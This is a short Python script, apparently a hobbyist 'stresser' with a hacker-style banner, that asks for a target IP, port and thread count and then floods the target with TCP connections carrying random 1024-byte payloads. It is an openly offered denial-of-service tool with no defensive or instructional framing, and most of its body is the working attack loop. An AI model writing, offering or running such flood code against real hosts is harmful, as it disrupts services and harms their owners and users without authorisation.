

from colorama import Fore, init, Back, Style
from tqdm import tqdm
import socket, random, threading, datetime, time

init()

print(Fore.RED + """
                                    
          ,--'#--.                       
   \\\    ///        wWw  wWw  ))   wW  Ww(o)__(o)    \\\  ///wW  Ww          (O))  ((O)       _     
 ((O)  (O))   /)   (O)  (O) (Oo)-.(O)(O)(__  __)/)  ((O)(O))(O)(O)  /)       ||    ||  wWw  /||_   
  | \  / |  (o)(O) / )  ( \  | (_))(..)   (  )(o)(O) | \ ||  (..) (o)(O)     || /\ ||  (O)_  /`_)  
  ||\\//||   //\\ / /    \ \ |  .'  ||     )(  //\\  ||\\||   ||   //\\      ||//\\|| .' __)|  `.  
  || \/ ||  |(__)|| \____/ | )|\\  _||_   (  )|(__)| || \ |  _||_ |(__)|     / /  \ \(  _)  | (_)) 
  ||    ||  /,-. |'. `--' .`(/  \)(_/\_)   )/ /,-. | ||  || (_/\_)/,-. |    ( /    \ )`.__) (.'-'  
 (_/    \_)-'   ''  `-..-'   )            (  -'   ''(_/  \_)     -'   ''     )      (        )     
 """)
print()    

print(Fore.LIGHTRED_EX,  " M-Injector0x00    MauriCRACK WEB ",  Fore.RESET, Back.LIGHTRED_EX, "Coding by: Mauritania Coder", Back.RESET)

print()

current_datetime = datetime.datetime.now()
formatted_datetime = current_datetime.strftime("%d/%m/%Y ~ %H:%M:%S")

print(Style.RESET_ALL)

request_threads = Back.RESET + Fore.YELLOW+ " THREADS > " + Fore.RESET
request_port = Back.RESET + Fore.YELLOW + " PORT > " + Fore.RESET
request_ip = Fore.YELLOW+ " IP > " + Fore.RESET

print(Back.RESET)

target_port = int(input(request_port))
target_ip = input(request_ip)
num_threads = int(input(request_threads))

def loading():
   with tqdm(total=100, desc=Fore.GREEN + 'attacking...', ascii=False, ncols=75) as pbar:
       for _ in range(100):
           time.sleep(0.5)
           pbar.update(1)
           tqdm.write(Fore.GREEN + 'attacking...')

def flood():
   while True:
       try:
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           loading()
           
           s.connect((target_ip, target_port))
           payload = random._urandom(1024)
           
           s.send(payload)
           
           s.close()
       except:
           pass


for _ in range(num_threads):
   t = threading.Thread(target=flood)
   t.start()

#created by Mauritaniainjector0x00 :: M-injector0x00
# run python3 and name script 

